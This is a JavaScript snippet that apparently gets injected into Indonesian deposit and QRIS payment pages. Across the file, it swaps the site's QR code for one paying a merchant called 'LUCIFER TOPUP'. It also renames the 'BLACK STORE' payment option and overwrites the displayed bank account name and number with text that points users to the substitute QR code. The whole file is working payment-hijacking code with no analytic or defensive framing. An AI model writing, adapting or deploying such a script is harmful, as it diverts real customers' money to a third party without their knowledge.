(function() {
  const url = window.location.href;

  // Jalankan jika URL mengandung "deposit"
  if (url.includes('/deposit')) {
    const qrisImg = document.getElementById('qrisImage');
    if (qrisImg) {
      qrisImg.src = "https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=00020101021126760024ID.CO.SPEEDCASH.MERCHANT01189360081530002142180215ID10250021421860303UKE51440014ID.CO.QRIS.WWW0215ID10254347309470303UKE5204581653033605802ID5913LUCIFER%20TOPUP6005MEDAN61052022662330509S2696179801091263632820703A0163045DEA";
    }
  }

  if (url.includes('deposit.php')) {
    const qrisImg = document.getElementById('qrisImage');
    if (qrisImg) {
      qrisImg.src = "https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=00020101021126760024ID.CO.SPEEDCASH.MERCHANT01189360081530002142180215ID10250021421860303UKE51440014ID.CO.QRIS.WWW0215ID10254347309470303UKE5204581653033605802ID5913LUCIFER%20TOPUP6005MEDAN61052022662330509S2696179801091263632820703A0163045DEA";
    }
  }

  if (url.includes('/deposit/')) {
    const qrisImg = document.getElementById('qrisImage');
    if (qrisImg) {
      qrisImg.src = "https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=00020101021126760024ID.CO.SPEEDCASH.MERCHANT01189360081530002142180215ID10250021421860303UKE51440014ID.CO.QRIS.WWW0215ID10254347309470303UKE5204581653033605802ID5913LUCIFER%20TOPUP6005MEDAN61052022662330509S2696179801091263632820703A0163045DEA";
    }
  }

  // Jalankan jika URL mengandung "qris.php"
  if (url.includes('qris.php')) {
    const targetImg = document.querySelector('img[src="https://imglink.io/i/ed871362-e302-4691-92e0-c8f075e780d6.jpg"]');
    if (targetImg) {
      targetImg.src = "https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=00020101021126760024ID.CO.SPEEDCASH.MERCHANT01189360081530002142180215ID10250021421860303UKE51440014ID.CO.QRIS.WWW0215ID10254347309470303UKE5204581653033605802ID5913LUCIFER%20TOPUP6005MEDAN61052022662330509S2696179801091263632820703A0163045DEA";
    }

    const metodeSelect = document.querySelector('select[name="metode"] option[selected]');
    if (metodeSelect && metodeSelect.textContent.includes("BLACK STORE")) {
      metodeSelect.textContent = "LUCIFER TOPUP";
    }
  }

  if (url.includes('/qris')) {
    const targetImg = document.querySelector('img[src="https://imglink.io/i/ed871362-e302-4691-92e0-c8f075e780d6.jpg"]');
    if (targetImg) {
      targetImg.src = "https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=00020101021126760024ID.CO.SPEEDCASH.MERCHANT01189360081530002142180215ID10250021421860303UKE51440014ID.CO.QRIS.WWW0215ID10254347309470303UKE5204581653033605802ID5913LUCIFER%20TOPUP6005MEDAN61052022662330509S2696179801091263632820703A0163045DEA";
    }

    const metodeSelect = document.querySelector('select[name="metode"] option[selected]');
    if (metodeSelect && metodeSelect.textContent.includes("BLACK STORE")) {
      metodeSelect.textContent = "LUCIFER TOPUP";
    }
  }
  
  if (url.includes('/qris/')) {
    const targetImg = document.querySelector('img[src="https://imglink.io/i/ed871362-e302-4691-92e0-c8f075e780d6.jpg"]');
    if (targetImg) {
      targetImg.src = "https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=00020101021126760024ID.CO.SPEEDCASH.MERCHANT01189360081530002142180215ID10250021421860303UKE51440014ID.CO.QRIS.WWW0215ID10254347309470303UKE5204581653033605802ID5913LUCIFER%20TOPUP6005MEDAN61052022662330509S2696179801091263632820703A0163045DEA";
    }

    const metodeSelect = document.querySelector('select[name="metode"] option[selected]');
    if (metodeSelect && metodeSelect.textContent.includes("BLACK STORE")) {
      metodeSelect.textContent = "LUCIFER TOPUP";
    }
  }

  // Jalankan jika ada parameter bank
  const bankParams = ['MjE=','MjM=','MjQ=','MjU=','MjY=','Mjc=','MTM2OA=='];
  if (bankParams.some(param => url.endsWith(`/?bank=${param}`))) {
    const namaAkunInput = document.getElementById('info-copy-1');
    if (namaAkunInput) namaAkunInput.value = "Alihkan Ke Qris";

    const namaAkunSpan = document.querySelector('[data-sel="info-copy-1"] span');
    if (namaAkunSpan) namaAkunSpan.textContent = "Alihkan Ke Qris";

    const rekeningInput = document.getElementById('info-copy-2');
    if (rekeningInput) rekeningInput.value = "A01 || Instan Deposit";

    const rekeningSpan = document.querySelector('[data-sel="info-copy-2"] span');
    if (rekeningSpan) rekeningSpan.textContent = "A01 || Instan Deposit";

    const rekeningContainer = rekeningInput?.parentElement;
    if (rekeningContainer && !document.getElementById('custom-qris-img')) {
      const img = document.createElement('img');
      img.id = 'custom-qris-img';
      img.src = "https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=00020101021126760024ID.CO.SPEEDCASH.MERCHANT01189360081530002142180215ID10250021421860303UKE51440014ID.CO.QRIS.WWW0215ID10254347309470303UKE5204581653033605802ID5913LUCIFER%20TOPUP6005MEDAN61052022662330509S2696179801091263632820703A0163045DEA";
      img.style.maxWidth = "200px";
      img.style.display = "block";
      img.style.marginTop = "10px";
      rekeningContainer.appendChild(img);
    }
  }
})();
